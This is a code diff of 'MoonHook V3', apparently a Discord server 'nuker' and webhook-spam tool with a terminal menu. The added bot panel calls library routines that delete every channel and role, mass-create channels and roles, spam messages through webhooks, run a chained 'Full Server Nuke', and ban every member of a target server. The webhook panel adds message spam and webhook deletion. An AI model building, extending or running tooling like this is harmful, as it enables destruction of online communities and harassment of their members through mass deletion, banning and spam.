@@ -1,17 +1,29 @@
 # // MoonHook V3 1.0.0
-    # Original by Tobias, V3 by Jasper
+# Original by Tobias, V3 by Jasper
 
-        # NOTE: Most of the code is inside the libraries
+# NOTE: Most of the code is inside the libraries
+# TODO: Fix guild error: https://cdn.discordapp.com/attachments/1330571297876607040/1449013739620925551/image.png?ex=693d5ab4&is=693c0934&hm=82a13beb0f08c44ff9785a535b5ca9a077563a35588fd21a6296ebfbcf1f2171&
 
 from datetime import datetime
+from moonhook_bots.core import (
+    GetBotClient,
+    GetGuildByID,
+    ban_everyone,
+    spam_messages,
+    start_bot,
+    stop_bot,
+)
 from moonhook_logging import Logger
 from moonhook_webhooks import DiscordWebhook
 import moonhook_bots
+import asyncio
 import threading
 import os
+import sys
 
 mainColor = Logger.rgb_to_ansi(255, 225, 0)
 rst = Logger.ColorReset()
+
 
 Banner = """
  __       __                                __    __                      __       
@@ -52,34 +64,165 @@ $$$$$$$/  $$/ $$$$$$$/   $$$$$$$/  $$$$$$/  $$/        $$$$$$$/       $$$$$$$/  
         MoonHook V3                                                                                                                                                                                                                     
 """
 
+
 def intInput(t):
     try:
         return int(input(f"{mainColor}MoonHook | {t}{rst}"))
     except:
         return 1
-    
+
+
 def strInput(t):
     return input(f"{mainColor}MoonHook | {t}{rst}")
 
-def BotsPanel(Token: str, GuildID: int):
+
+def BotsPanel(Token: str, TargetGuild):
     Logger.clear()
+
+    botClient = GetBotClient()
 
     rgbGradientStart = (250, 102, 102)
     rgbGradientEnd = (255, 0, 0)
 
-    botRunning = False
-
     Logger.print_gradient_ascii(BotsBanner, rgbGradientStart, rgbGradientEnd)
-    print(f"\nMoonHook Bot Panel\n 1. Activate Bot\n 2. Delete All Channels\n 3. Channel Spam\n 4. Delete All Roles\n 5. Role Spam\n {Logger.rgb_to_ansi(255, 0, 0)}6. ⚠️ Full Server Nuke{rst}\n 7. Exit back to menu")
+    print(
+        f"\nMoonHook Bot Panel\n 1. Activate Bot\n 2. Delete All Channels\n 3. Channel Spam\n 4. Delete All Roles\n 5. Role Spam\n {Logger.rgb_to_ansi(255, 0, 0)}6. ⚠️ Full Server Nuke{rst}\n 7. Deactivate Bot\n 8. Message Spam\n{Logger.rgb_to_ansi(255, 0, 0)} 9. ⚠️Ban Everyone\n 10. Back to main menu"
+    )
 
     selection = intInput("Select Option (1-7): ")
-    
+
     if selection == 1:
         Logger.Log("Attempting to start bot..")
-        threading.Thread()
+
+        def _cnt():
+            asyncio.run(moonhook_bots.start_bot(Token))
+
+        threading.Thread(target=_cnt, daemon=True).start()
+
         Logger.Log("If you got no error messages, this means that the bot had started.")
-        os.system("pause")
-        BotsPanel(Token, GuildID)
+        Logger.AwaitInput()
+        BotsPanel(Token, TargetGuild)
+    elif selection == 2:
+        Logger.Log("Attempting to delete every channel..")
+
+        future = asyncio.run_coroutine_threadsafe(
+            moonhook_bots.delete_channels(TargetGuild), botClient.loop_ref
+        )
+        future.result()
+
+        Logger.AwaitInput()
+        BotsPanel(Token, TargetGuild)
+    elif selection == 3:
+        cspmtxt = strInput("Channel name: ")
+        cspmamnt = intInput("Amount of channels: ")
+        Logger.Log("Attempting to channel spam..")
+
+        future = asyncio.run_coroutine_threadsafe(
+            moonhook_bots.create_channels(TargetGuild, cspmamnt, cspmtxt),
+            botClient.loop_ref,
+        )
+        future.result()
+        Logger.AwaitInput()
+        BotsPanel(Token, TargetGuild)
+    elif selection == 4:
+        Logger.Log("Attempting to delete roles..")
+
+        future = asyncio.run_coroutine_threadsafe(
+            moonhook_bots.delete_roles(TargetGuild), botClient.loop_ref
+        )
+        future.result()
+        Logger.AwaitInput()
+        BotsPanel(Token, TargetGuild)
+    elif selection == 5:
+        rspmtxt = strInput("Role name: ")
+        rspmamnt = intInput("Amount of roles: ")
+
+        Logger.Log("Attempting to role spam..")
+
+        future = asyncio.run_coroutine_threadsafe(
+            moonhook_bots.create_roles(TargetGuild, rspmtxt, rspmamnt),
+            botClient.loop_ref,
+        )
+        future.result()
+        Logger.AwaitInput()
+        BotsPanel(Token, TargetGuild)
+    elif selection == 6:
+        messagespamtext = strInput("Message to spam: ")
+        messagespamcooldown = intInput("Message spam cooldown(s): ")
+        channelspamtext = strInput("Channel, Role, Webhook names: ")
+        amounttospam = intInput("Amount of channels, roles, webhooks to spam: ")
+        _confirmation = strInput("Are you sure you want to spam everything? (y/n)")
+        Logger.Log("Performing a full server nuke..")
+
+        if _confirmation.lower().strip() != "y":
+            Logger.Log("Cancelled.")
+            Logger.AwaitInput()
+            BotsPanel(Token, TargetGuild)
+
+        # // Delete stuff
+        asyncio.run_coroutine_threadsafe(
+            moonhook_bots.delete_channels(TargetGuild), botClient.loop_ref
+        ).result()
+
+        asyncio.run_coroutine_threadsafe(
+            moonhook_bots.delete_roles(TargetGuild), botClient.loop_ref
+        ).result()
+
+        # // Do stuff
+        asyncio.run_coroutine_threadsafe(
+            moonhook_bots.create_channels(TargetGuild, amounttospam, channelspamtext),
+            botClient.loop_ref,
+        ).result()
+
+        asyncio.run_coroutine_threadsafe(
+            moonhook_bots.create_roles(TargetGuild, channelspamtext, amounttospam),
+            botClient.loop_ref,
+        ).result()
+
+        asyncio.run_coroutine_threadsafe(
+            spam_messages(
+                TargetGuild, channelspamtext, messagespamtext, messagespamcooldown
+            ),
+            botClient.loop_ref,
+        ).result()
+
+        Logger.AwaitInput()
+        BotsPanel(Token, TargetGuild)
+    elif selection == 7:
+        Logger.Log("Attempting to stop bot.. (Bot may take a bit to go offline.)")
+
+        asyncio.run_coroutine_threadsafe(stop_bot(), botClient.loop_ref)
+        Logger.AwaitInput()
+        BotsPanel(Token, TargetGuild)
+    elif selection == 8:
+        messagespamtext = strInput("Text to spam: ")
+        messagespamcooldown = intInput("Spam cooldown: ")
+        webhooknames = strInput(
+            "Webhook name(NOTE: if you previously nuked all, or message spammed, I recommend you use the same webhook name as you did previously.): "
+        )
+        Logger.Log("Spamming messages..")
+
+        asyncio.run_coroutine_threadsafe(
+            spam_messages(
+                TargetGuild, webhooknames, messagespamtext, messagespamcooldown
+            ),
+            botClient.loop_ref,
+        ).result()
+        Logger.AwaitInput()
+        BotsPanel(Token, TargetGuild)
+    elif selection == 9:
+        _confirmation = strInput("Are you sure you want to ban everyone? (y/n): ")
+
+        if _confirmation.lower().strip() != "y":
+            Logger.Log("Cancelled.")
+            Logger.AwaitInput()
+            BotsPanel(Token, TargetGuild)
+
+        Logger.Log("Attempting to ban everyone..")
+        asyncio.run_coroutine_threadsafe(ban_everyone(TargetGuild), botClient.loop_ref)
+    else:
+        main()
+
 
 def WebhookPanel(url: str):
     Logger.clear()
@@ -88,12 +231,14 @@ def WebhookPanel(url: str):
     rgbGradientEnd = (66, 135, 245)
 
     Logger.print_gradient_ascii(WebhooksBanner, rgbGradientStart, rgbGradientEnd)
-    print("\nMoonHook Webhook Panel\n 1. Send Message\n 2. Webhook Spam\n 3. Change Webhook Name\n 4. Change Webhook Avatar\n 5. Delete Webhook\n 6. Exit back to main panel")
+    print(
+        "\nMoonHook Webhook Panel\n 1. Send Message\n 2. Webhook Spam\n 3. Change Webhook Name\n 4. Change Webhook Avatar\n 5. Delete Webhook\n 6. Exit back to main panel"
+    )
 
     selection = intInput("Select Option (1-6): ")
 
     hook = DiscordWebhook(url)
-    
+
     if selection == 1:
         print("Select Content Type\n 1. Plain Text\n 2. JSON string")
         cType = strInput("Select Content Type (1-2): ")
@@ -104,10 +249,12 @@ def WebhookPanel(url: str):
             code, result = hook.SendMessage(content)
 
             if result != "":
-                Logger.Log(f"{Logger.rgb_to_ansi(255, 0, 0)}Sending error: {result}{rst}")
+                Logger.Log(
+                    f"{Logger.rgb_to_ansi(255, 0, 0)}Sending error: {result}{rst}"
+                )
                 os.system("pause")
                 main()
-            
+
             Logger.Log("Successfully sent message!")
             os.system("pause")
             WebhookPanel(url)
@@ -116,10 +263,12 @@ def WebhookPanel(url: str):
             code, result = hook.SendRawContent(content)
 
             if result != "":
-                Logger.Log(f"{Logger.rgb_to_ansi(255, 0, 0)}Sending error: {result}{rst}")
+                Logger.Log(
+                    f"{Logger.rgb_to_ansi(255, 0, 0)}Sending error: {result}{rst}"
+                )
                 os.system("pause")
                 WebhookPanel(url)
-            
+
             Logger.Log("Successfully sent message!")
             os.system("pause")
             WebhookPanel(url)
@@ -133,9 +282,9 @@ def WebhookPanel(url: str):
         Logger.Log("Beginning webhook spam...")
 
         try:
-            hook.WebhookSpam(cType, content, delay) 
+            hook.WebhookSpam(cType, content, delay)
         except KeyboardInterrupt:
-            WebhookPanel(url)    
+            WebhookPanel(url)
 
     elif selection == 3:
         newName = strInput("Enter the new webhook name: ")
@@ -160,7 +309,9 @@ def WebhookPanel(url: str):
         WebhookPanel(url)
 
     elif selection == 5:
-        confirmation = strInput("Are you sure you want to delete this webhook? (Y/N): ").lower()
+        confirmation = strInput(
+            "Are you sure you want to delete this webhook? (Y/N): "
+        ).lower()
         if confirmation == "y":
             Logger.Log("Attempting to delete webhook..")
             code, result = hook.DeleteWebhook()
@@ -192,19 +343,29 @@ MoonHook V3 Written by Jasper (@u235consumer)
 Original moonhook by @_tobiaszeq_""")
     Logger.print_random_message()
 
-    print("MoonHook Panel\n 1. Webhooks\n 2. Bots")
+    print("MoonHook Panel\n 1. Webhooks\n 2. Bots\n 3. Exit")
 
-    selection = intInput("Select an option (1-2): ")
+    selection = intInput("Select an option (1-3): ")
 
     if selection == 1:
-        wUrl = strInput("Enter your webhook URL: ")
+        wUrl = strInput("Enter your webhook URL: ").strip()
         WebhookPanel(wUrl)
     elif selection == 2:
-        token = strInput("Enter your bot token: ")
+        token = strInput("Enter your bot token: ").strip()
         guildID = intInput("Enter your guild / server ID: ")
-        BotsPanel(token, guildID)
+
+        def _cnt():
+            asyncio.run(moonhook_bots.start_bot(token))
+
+        threading.Thread(target=_cnt, daemon=True).start()
+
+        BotsPanel(token, GetGuildByID(guildID))
+    elif selection == 3:
+        Logger.clear()
+        sys.exit()
     else:
         print(f"{Logger.rgb_to_ansi(255, 0, 0)}Invalid selection!{rst}")
+
 
 if __name__ == "__main__":
     main()
